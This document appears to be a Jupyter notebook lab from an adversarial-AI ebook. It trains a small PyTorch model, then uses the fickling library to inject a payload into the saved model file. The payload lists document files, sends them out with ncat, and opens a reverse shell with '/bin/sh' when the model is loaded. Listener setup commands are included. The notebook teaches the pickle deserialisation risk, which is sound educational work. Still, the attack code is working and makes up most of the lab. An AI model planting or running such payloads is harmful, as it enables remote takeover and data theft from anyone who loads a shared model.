{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "c384047e",
   "metadata": {},
   "source": [
    "<img style=\"max-width:20em; height:auto;\" src=\"../graphics/A-Little-Book-on-Adversarial-AI-Cover.png\"/>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a9192c89",
   "metadata": {},
   "source": [
    "Author: Nik Alleyne   \n",
    "Author Blog: https://www.securitynik.com   \n",
    "Author GitHub: github.com/securitynik   \n",
    "\n",
    "Author Other Books: [   \n",
    "\n",
    "            \"https://www.amazon.ca/Learning-Practicing-Leveraging-Practical-Detection/dp/1731254458/\",   \n",
    "            \n",
    "            \"https://www.amazon.ca/Learning-Practicing-Mastering-Network-Forensics/dp/1775383024/\"   \n",
    "        ]   \n",
    "\n",
    "\n",
    "This notebook ***(fickling_neural_net.ipynb)*** is part of the series of notebooks From ***A Little Book on Adversarial AI***  A free ebook released by Nik Alleyne"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cc5678c3",
   "metadata": {},
   "source": [
    "### Fickling Neural Nets  "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f74394e4",
   "metadata": {},
   "source": [
    "Now that we understand this from a traditional machine learning perspective and we have had the experience of learning that this all has to do with the **__reduce__** method, let us try another toy dataset, this time looking at the issue from a Neural Network (Deep Learning) perspective. \n",
    "\n",
    "More importantly, rather than running commands to query the local host, we are going to jump ahead and setup a reverse shell, to give us access to device which is loading the model.\n",
    "\n",
    "\n",
    "### Lab Objectives:  \n",
    "- Extend our understanding of the pickle problem   \n",
    "- Recognize that this is not just about traditional machine learning but also deep learning   \n",
    "- Expand our knowledge with getting access to remote devices when they load the compromised model    \n",
    "\n",
    "\n",
    "### Step 1:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "ebc5a65c",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Import the libraries \n",
    "from sklearn.datasets import make_classification\n",
    "import torch\n",
    "import torch.nn as nn\n",
    "import torch.nn.functional as F"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "6b4cd898",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Torch version used:  2.7.1+cu128\n"
     ]
    }
   ],
   "source": [
    "### Version of key libraries used  \n",
    "print(f'Torch version used:  {torch.__version__}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "fc91fd9a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Setting the device to cuda\n"
     ]
    }
   ],
   "source": [
    "# Setup the device to work with\n",
    "# This should ensure if there are accelerators in place, such as Apple backend or CUDA, \n",
    "# we should be able to take advantage of it.\n",
    "\n",
    "if torch.cuda.is_available():\n",
    "    print('Setting the device to cuda')\n",
    "    device = 'cuda'\n",
    "elif torch.backends.mps.is_available():\n",
    "    print('Setting the device to Apple mps')\n",
    "    device = 'mps'\n",
    "else:\n",
    "    print('Setting the device to CPU')\n",
    "    device = torch.device('cpu')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "edf1b32f",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(array([[-1.01767522, -2.39557201,  0.5039269 , -1.19420581, -0.36427809,\n",
       "          0.26439469,  1.08522707, -0.14506454,  0.89256403,  0.18833121,\n",
       "          0.20732957,  0.78108986,  0.88577486,  0.30866767,  0.35693907,\n",
       "          0.0110227 , -0.85752252,  2.31912732, -0.86785291,  0.98007413],\n",
       "        [-0.5864071 ,  0.73717898,  0.70387872, -0.73048734,  0.97055953,\n",
       "          0.53348902,  0.00471054,  0.21855883,  0.56292179, -0.60498772,\n",
       "         -0.46253912,  0.49881915,  0.52454074,  0.19212229,  0.14703394,\n",
       "          0.62745097,  1.20290292, -0.25355802, -0.68472634, -0.33994862],\n",
       "        [ 1.53291452, -0.56298605, -0.19748563,  1.20806065, -0.26513777,\n",
       "          0.47868925, -1.17629904,  1.21411355, -0.48274742, -2.37675778,\n",
       "         -1.76559325, -0.49683225,  1.19953434, -0.43228335,  0.43065099,\n",
       "         -0.98142548, -0.31481729,  0.78499888, -1.26796367,  0.72482979],\n",
       "        [-1.00174936,  0.86417055, -0.19682771, -0.88362438,  1.02783893,\n",
       "          0.08498287, -0.4141195 , -1.46141364,  0.22422744, -0.00816779,\n",
       "         -0.31907968,  0.43302058, -1.4405723 ,  0.94629866, -0.12881374,\n",
       "          0.83351469, -1.04438315,  0.13216815,  0.41812871, -0.96898925],\n",
       "        [ 1.42031763, -0.48998258,  0.95547872,  1.30384355, -0.29040624,\n",
       "          2.32713584,  1.77520367, -0.02922204, -0.98811367, -1.03528206,\n",
       "         -0.65184061, -0.67264137,  0.42115189,  1.50297201,  0.38924727,\n",
       "         -0.29397881, -2.03524018, -0.32211702, -0.37048813,  0.28003912]]),\n",
       " array([0, 0, 0, 1, 1]))"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Create the toy dataset\n",
    "X, y = make_classification(n_samples=100, n_classes=2, random_state=10)\n",
    "\n",
    "# Take a sneak peak at the first 5 records of X and y\n",
    "X[:5], y[:5]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "06e1ccc2",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "X.shape is: (100, 20)\n",
      "y.shape is: (100,)\n"
     ]
    }
   ],
   "source": [
    "# Get the shape of the data\n",
    "print(f'X.shape is: {X.shape}')\n",
    "print(f'y.shape is: {y.shape}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "ec586857",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "X's data type before conversion is: <class 'numpy.ndarray'> -> float64\n",
      "y's data type before conversion is: <class 'numpy.ndarray'> -> int64\n",
      "\n",
      "Converting both X and y to PyTorch tensors ...\n",
      "\n",
      "X's data type after conversion is: <class 'torch.Tensor'> -> torch.float32\n",
      "y's data type after conversion is: <class 'torch.Tensor'> -> torch.float32\n"
     ]
    }
   ],
   "source": [
    "# To use this in our PyTorch neural network, \n",
    "# we need to convert these from numpy arrays to Pytorch tensors\n",
    "\n",
    "print(f\"X's data type before conversion is: {type(X)} -> {X.dtype}\")\n",
    "print(f\"y's data type before conversion is: {type(y)} -> {y.dtype}\")\n",
    "\n",
    "print(f'\\nConverting both X and y to PyTorch tensors ...')\n",
    "\n",
    "# Convert these samples from numpy arrays to torch tensors\n",
    "X = torch.tensor(data=X, dtype=torch.float32, device=device)\n",
    "y = torch.tensor(data = y.reshape(-1, 1), dtype=torch.float32, device=device)\n",
    "\n",
    "print(f\"\\nX's data type after conversion is: {type(X)} -> {X.dtype}\")\n",
    "print(f\"y's data type after conversion is: {type(y)} -> {y.dtype}\")\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ae7ff163",
   "metadata": {},
   "source": [
    "### !Note:  \n",
    "The network we are going to build is based on this architecture. However, we will have 20 input neurons, i.e features. However, This diagram below only has seven. This is simply because I was not able to add more layers in the playground. However, the concepts remains exactly the same once we pass the input layer. There is one hidden layer that has 8 neurons. Those 8 neurons are then connected to an output of one neuron. This will be a binary classification problem.  \n",
    "\n",
    "<img style=\"max-width:40em; height:auto;\" src=\"../graphics/tf_playground_neural_net.png\"/>\n",
    "\n",
    "\n",
    "### Step 2:  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "64567b4a",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Create a simple torch network\n",
    "class SimpleNet(nn.Module):\n",
    "    def __init__(self,):\n",
    "        super().__init__()\n",
    "        self.layers = nn.Sequential( \n",
    "            nn.Linear(in_features=X.size(dim=1), out_features=8),\n",
    "            nn.ReLU(),\n",
    "            nn.Linear(in_features=8, out_features=1),\n",
    "            nn.Sigmoid()\n",
    "        )\n",
    "    \n",
    "    def forward(self, x):\n",
    "        out = self.layers(x)\n",
    "        return out"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "113870f5",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "tensor([[0.5659],\n",
       "        [0.4796],\n",
       "        [0.5605],\n",
       "        [0.5314],\n",
       "        [0.5363],\n",
       "        [0.5383],\n",
       "        [0.5140],\n",
       "        [0.5458],\n",
       "        [0.5480],\n",
       "        [0.4835]], device='cuda:0', grad_fn=<SliceBackward0>)"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Set a random seed so the parameters always start at the same place\n",
    "torch.manual_seed(seed=10)\n",
    "\n",
    "# Instantiate the model\n",
    "simple_model = SimpleNet().to(device=device)\n",
    "\n",
    "# Make predictions on the untrained model\n",
    "untrained_preds = simple_model(X.to(device))\n",
    "\n",
    "# Take a look at the first 10 records\n",
    "untrained_preds[:10]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "9b8b2752",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "tensor(0.5000, device='cuda:0')"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Get the untrained model accuracy\n",
    "# This suggest we have 50% accuracy via the untrained model\n",
    "(untrained_preds.round() == y).sum() / y.size(dim=0) "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "96ca1ff9",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Epoch: 1/100 \taccuracy:0.5 \t loss:0.7180083990097046\n",
      "Epoch: 11/100 \taccuracy:0.8100000023841858 \t loss:0.5911996960639954\n",
      "Epoch: 21/100 \taccuracy:0.8899999856948853 \t loss:0.45934081077575684\n",
      "Epoch: 31/100 \taccuracy:0.9300000071525574 \t loss:0.325526624917984\n",
      "Epoch: 41/100 \taccuracy:0.949999988079071 \t loss:0.22560203075408936\n",
      "Epoch: 51/100 \taccuracy:0.9799999594688416 \t loss:0.15741677582263947\n",
      "Epoch: 61/100 \taccuracy:0.9799999594688416 \t loss:0.11038202047348022\n",
      "Epoch: 71/100 \taccuracy:0.9899999499320984 \t loss:0.07750357687473297\n",
      "Epoch: 81/100 \taccuracy:0.9899999499320984 \t loss:0.05485496297478676\n",
      "Epoch: 91/100 \taccuracy:0.9899999499320984 \t loss:0.0392584502696991\n"
     ]
    }
   ],
   "source": [
    "# Train the model, similar to what would happen in the real world\n",
    "# Setup a loss function\n",
    "loss_fn = nn.BCELoss()\n",
    "\n",
    "# Setup the optimizer to handle gradient descent\n",
    "optimizer = torch.optim.AdamW(params=simple_model.parameters(), lr=0.01)\n",
    "\n",
    "# Set the number of epochs\n",
    "num_epochs = 100\n",
    "\n",
    "# Put the model in train model\n",
    "simple_model.train(mode=True)\n",
    "\n",
    "# Train the model\n",
    "for epoch in range(num_epochs):\n",
    "    # Clear the gradients\n",
    "    for p in simple_model.parameters():\n",
    "        p.grad = None\n",
    "\n",
    "    # make the predictions\n",
    "    preds = simple_model(X)\n",
    "    loss = loss_fn(input=preds, target=y)\n",
    "\n",
    "    # perform backpropagation\n",
    "    loss.backward()\n",
    "\n",
    "    # Perform gradient descent\n",
    "    optimizer.step()\n",
    "\n",
    "    # calculate the model accuracy\n",
    "    accuracy = (y == preds.round()).sum()/y.size(dim=0)\n",
    "    \n",
    "    if epoch % 10 == 0:\n",
    "        print(f'Epoch: {epoch+1}/{num_epochs} \\taccuracy:{accuracy} \\t loss:{loss}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "fd24486a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/tmp/my_trusted_simple_model.pth\n",
      "bb4316ec6d2bcbf0d9906352d9f56b49  /tmp/my_trusted_simple_model.pth\n"
     ]
    }
   ],
   "source": [
    "# Save the model\n",
    "# This is where Pytorch is using the Python's Pickle library to save the model\n",
    "# Use the new zip file format to save the file\n",
    "# This tells torch to save the model's state dictionary\n",
    "# We could save the entire model with torch.save()\n",
    "# However, that is not the recommended way to save your models\n",
    "# This is one of the ways you should be saving your models in production\n",
    "torch.save(obj=simple_model.state_dict(), f='/tmp/my_trusted_simple_model.pth', _use_new_zipfile_serialization=True)\n",
    "\n",
    "# Validate the model has been created\n",
    "!ls /tmp/my_trusted_simple_model.pth\n",
    "\n",
    "# Validate the integrity of the model\n",
    "!md5sum /tmp/my_trusted_simple_model.pth"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "c7bb1b0c",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Verify that the model can be loaded\n",
    "# simple_model.load_state_dict(state_dict=torch.load(f=r'/tmp/my_trusted_simple_model.pth', weights_only=False))"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7cd7368d",
   "metadata": {},
   "source": [
    "### Step 3:   "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "a2e2b820",
   "metadata": {},
   "outputs": [],
   "source": [
    "# prepare to compromise the model\n",
    "\n",
    "from fickling.pytorch import PyTorchModelWrapper\n",
    "# https://github.com/trailofbits/fickling/blob/master/example/inject_pytorch.py\n",
    "# https://hiddenlayer.com/innovation-hub/machine-learning-threat-roundup/  \n",
    "# https://blog.trailofbits.com/2024/03/04/relishing-new-fickling-features-for-securing-ml-systems/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "4c353bf9",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "bb4316ec6d2bcbf0d9906352d9f56b49  /tmp/my_trusted_simple_model.pth\n"
     ]
    }
   ],
   "source": [
    "# Steal the model .... somehow :-)\n",
    "# Or share a compromised model.\n",
    "stolen_model = PyTorchModelWrapper('/tmp/my_trusted_simple_model.pth')\n",
    "stolen_model\n",
    "\n",
    "# Validate the model's integrity before compromising it\n",
    "# This value is the same as above.\n",
    "!md5sum /tmp/my_trusted_simple_model.pth"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "a7b6ef68",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Setup a variable with the commands to execute when the model loads\n",
    "# Notice also, all the libraries we need are being loaded as part of the variable\n",
    "\n",
    "COMPROMISE_CODE = \"\"\"   \n",
    "import os\n",
    "import subprocess as sp\n",
    "\n",
    "with open(file='/tmp/recon.txt', mode='wt') as recon_fp:\n",
    "  recon_fp.write('Beginning Reconnaissance ....\\\\n')\n",
    "\n",
    "  for file in os.listdir(path='/tmp/'):\n",
    "    if file.endswith('.doc') or file.endswith('.xls'):\n",
    "      recon_fp.write(f'{file}\\\\n')\n",
    "\n",
    "\n",
    "  recon_fp.write('Ending Reconnaissance ...\\\\n')\n",
    "  print('Exfiltrating ...')\n",
    "\n",
    "# Exfiltrate the reconnaissance information\n",
    "# Notice in this case, we are not using the --ssl option. \n",
    "# This is just so we understand the importance of encrypting our sessions\n",
    "# Ensure you have a listener setup on the remote host:\n",
    "#   $ ncat --verbose --listen 9999 --keep-open\n",
    "sp.call(['ncat', '--verbose', '127.0.0.1', '9998'], stdin=open(file='/tmp/recon.txt', mode='rt'))\n",
    "\n",
    "# Create the backdoor reverse shell\n",
    "# Ensure you setup a netcat session on the remote host: \n",
    "#   $ ncat --verbose --listen 9999 --ssl --keep-open\n",
    "\n",
    "# This is one way to do it\n",
    "# We will use another way sooner, with built in tools rather than having to install ncat\n",
    "sp.Popen(['ncat', '--verbose', '127.0.0.1', '9999', '--exec', '/bin/sh', '--ssl'])\n",
    "\n",
    "\"\"\"\n",
    "\n",
    "# We can run this cell to test the compromise code before using it\n",
    "#exec(COMPROMISE_CODE)\n",
    "\n",
    "# However, just like previously, we need to fix this up. We need to get all of this on oneline"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "2f4d0fc4",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Compromise the stolen model\n",
    "# We would have love to be able to do something like this\n",
    "#stolen_model.inject_payload(COMPROMISE_CODE,  output_path='/tmp/new_torch.pt', injection='insertion', overwrite=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8bcc6e97",
   "metadata": {},
   "source": [
    "Instead we have to do below. If you find a cleaner way to solve this problem let me know. However, this is the same code as above without the comments. Notice I also am using two ports, one is 9998 and the other 9999. This is because we are performing two tasks at the same time. First we are exfiltrating the reconnaissance data and second, we are setting up the reverse shell.   \n",
    "Notice the **--exec /bin/sh***   \n",
    "\n",
    "Setup two listeners on your host:   \n",
    "$ **ncat --verbose --listen 9999 --keep-open --ssl**   \n",
    "\n",
    "$ **ncat --verbose --listen 9998  --keep-open**     \n",
    "\n",
    "\n",
    "Create a few files   \n",
    "$ touch test.doc\n",
    "$ touch test1.doc\n",
    "$ touch test2.doc\n",
    "$ touch test3.doc\n",
    "$\n",
    "$ touch test.xls\n",
    "$ touch test1.xls\n",
    "$ touch test2.xls\n",
    "$ touch test3.xls\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "379b9a8e",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Inject the payload into the model\n",
    "stolen_model.inject_payload(payload=\"\"\"import os   \\nimport subprocess as sp  \\nwith open(file='/tmp/recon.txt', mode='wt') as recon_fp:  \\n\\trecon_fp.write('Beginning Reconnaissance ....\\\\n')    \\n\\tfor file in os.listdir(path='/tmp/'):    \\n\\t\\tif file.endswith('.doc') or file.endswith('.xls'):  \\n\\t\\t\\trecon_fp.write(f'{file}\\\\n')  \\n\\trecon_fp.write('Ending Reconnaissance ...\\\\n')   \\n\\tprint('Exfiltrating ...')   \\nsp.call(['ncat', '--verbose', '127.0.0.1', '9998'], stdin=open(file='/tmp/recon.txt', mode='rt'))    \\nsp.Popen(['ncat', '--verbose', '127.0.0.1', '9999', '--exec', '/bin/sh', '--ssl'])   \"\"\", output_path='/tmp/new_torch.pt', injection='insertion', overwrite=True )"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "131bce80",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "43a7e92079c440401db38a63c4effad1  /tmp/my_trusted_simple_model.pth\n"
     ]
    }
   ],
   "source": [
    "# We see below that the model's integrity has changed\n",
    "!md5sum /tmp/my_trusted_simple_model.pth"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "de2f85e5",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "SimpleNet(\n",
       "  (layers): Sequential(\n",
       "    (0): Linear(in_features=20, out_features=8, bias=True)\n",
       "    (1): ReLU()\n",
       "    (2): Linear(in_features=8, out_features=1, bias=True)\n",
       "    (3): Sigmoid()\n",
       "  )\n",
       ")"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Because we stored the state dict, which is the recommended way of saving torch models, we need to reconstruct the model class\n",
    "# This is not a problem as is exactly what you would do in production\n",
    "# Note this is just one approach and there are other approaches, \n",
    "# such as saving the entire model with torch.save\n",
    "# or even using torch.jit.export()\n",
    "# We are going to stick with the recommended way\n",
    "\n",
    "# Let's recreate the class\n",
    "# In production we can just copy and paste this code\n",
    "class SimpleNet(nn.Module):\n",
    "    def __init__(self,):\n",
    "        super().__init__()\n",
    "        self.layers = nn.Sequential( \n",
    "            nn.Linear(in_features=X.size(dim=1), out_features=8),\n",
    "            nn.ReLU(),\n",
    "            nn.Linear(in_features=8, out_features=1),\n",
    "            nn.Sigmoid()\n",
    "        )\n",
    "    \n",
    "    def forward(self, x):\n",
    "        out = self.layers(x)\n",
    "        return out\n",
    "    \n",
    "# Instantiate the class again\n",
    "simple_model = SimpleNet().to(device=device)\n",
    "simple_model"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d683a4c0",
   "metadata": {},
   "source": [
    "# \n",
    "Remember to setup your nectat listener   \n",
    "$ ncat --verbose --listen 9999 --ssl   \n",
    "\n",
    "As always, let's also validate the our solution works outside of the notebook and can run independently of this hotebook   \n",
    "Remember you need to be in your **labs** directory    \n",
    "$ python load_model.py --model /tmp/my_trusted_simple_model.pth"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cc74e872",
   "metadata": {},
   "source": [
    "Now when the user in the organization tries to use the mode ...   \n",
    "Load/deserialize the model to prepare to make predictions.  Simply loading the model here will cause the malicious code to execute. \n",
    "\n",
    "Notice, this information is only being shown below, so we can see what is happening.  Realistically, we would go back to the COMPROMISE_CODE and remove the --verbose option"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "45877fa4",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Exfiltrating ...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Ncat: Version 7.94SVN ( https://nmap.org/ncat )\n",
      "Ncat: Connection refused.\n",
      "Ncat: Version 7.94SVN ( https://nmap.org/ncat )\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "<All keys matched successfully>"
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Show that the loaded model can still make predictions\n",
    "# First put the model in eval mode\n",
    "#loaded_trusted_pwnd_model.eval()\n",
    "\n",
    "# Make some predictions\n",
    "#loaded_trusted_pwnd_model(X)[:10]\n",
    "#loaded_trusted_pwnd_model\n",
    "\n",
    "# Load up the model state dictionary\n",
    "simple_model.load_state_dict(state_dict=torch.load(f=r'/tmp/my_trusted_simple_model.pth', weights_only=False, map_location=device))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "062c5c9c",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "tensor([[8.6402e-03],\n",
       "        [6.1995e-02],\n",
       "        [2.8719e-03],\n",
       "        [9.1484e-01],\n",
       "        [9.5764e-01],\n",
       "        [9.9731e-01],\n",
       "        [4.9077e-02],\n",
       "        [1.1643e-04],\n",
       "        [9.7802e-01],\n",
       "        [9.9998e-01]], device='cuda:0', grad_fn=<SliceBackward0>)"
      ]
     },
     "execution_count": 21,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# As always, we still want to know that our model can make predictions\n",
    "simple_model.eval()\n",
    "\n",
    "# Make some predictions\n",
    "simple_model(X)[:10]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7c0e121c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Cleaning cuda cache\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Ncat: TIMEOUT.\n"
     ]
    }
   ],
   "source": [
    "# With the training finish clear the GPU cache\n",
    "# Setup the device to work with\n",
    "if torch.cuda.is_available():\n",
    "    # For CUDA GPU\n",
    "    print(f'Cleaning {device} cache')\n",
    "    torch.cuda.empty_cache()\n",
    "elif torch.backends.mps.is_available():\n",
    "    # For Apple devices\n",
    "    print(f'Cleaning {device} cache')\n",
    "    torch.mps.empty_cache()\n",
    "else:\n",
    "    # Default to cpu\n",
    "    pass"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "58c32a05",
   "metadata": {},
   "source": [
    "# Lab Takeaways:   \n",
    "- We extend our attacks against the pickle format towards neural nets   \n",
    "- We learnt how to perform exfiltration via the models   \n",
    "- We saw how we could setup a reverse shell by compromising the model   "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f7e5e967",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "adversarial_ai",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.11"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
